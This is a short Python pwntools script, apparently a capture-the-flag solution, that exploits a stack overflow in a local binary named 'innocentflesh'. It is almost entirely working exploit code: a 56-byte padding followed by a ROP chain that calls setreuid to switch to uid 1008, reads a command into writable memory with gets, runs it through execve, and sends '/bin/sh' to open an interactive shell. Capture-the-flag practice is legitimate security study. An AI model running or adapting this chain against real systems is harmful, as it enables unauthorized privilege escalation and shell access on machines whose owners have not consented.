from pwn import *

context.arch = 'amd64'

padding     = b"A" * 56
pop_rdi     = 0x401eff
pop_rsi     = 0x409f6e
pop_rdx_rbx = 0x485d6b  # pop rdx; pop rbx; ret
pop_rax     = 0x44fec7
syscall     = 0x41a986
gets_addr   = 0x412150
data_addr   = 0x4c5000   # Writable area
ret         = 0x401822   # Stack alignment
task02flag_uid = 1008

p = process('./innocentflesh')


# 1. setreuid(1008, 1008)
# RAX = 113 (0x71), RDI = 1008, RSI = 1008
rop =  p64(pop_rax) + p64(113)
rop += p64(pop_rdi) + p64(task02flag_uid)
rop += p64(pop_rsi) + p64(task02flag_uid)
rop += p64(syscall)

# 2. gets(data_addr)
# Prompt for shell command string in memory
rop += p64(pop_rdi) + p64(data_addr)
rop += p64(gets_addr)

# 3. execve(data_addr, 0, 0)
# RAX = 59 (0x3b), RDI = data_addr, RSI = 0, RDX = 0
rop += p64(pop_rax) + p64(59)
rop += p64(pop_rdi) + p64(data_addr)
rop += p64(pop_rsi) + p64(0)
rop += p64(pop_rdx_rbx) + p64(0) + p64(0) # rdx=0, rbx=junk
rop += p64(syscall)

payload = padding + rop


p.sendlineafter(b"> ", payload)

p.sendline(b"/bin/sh\x00")

p.interactive()
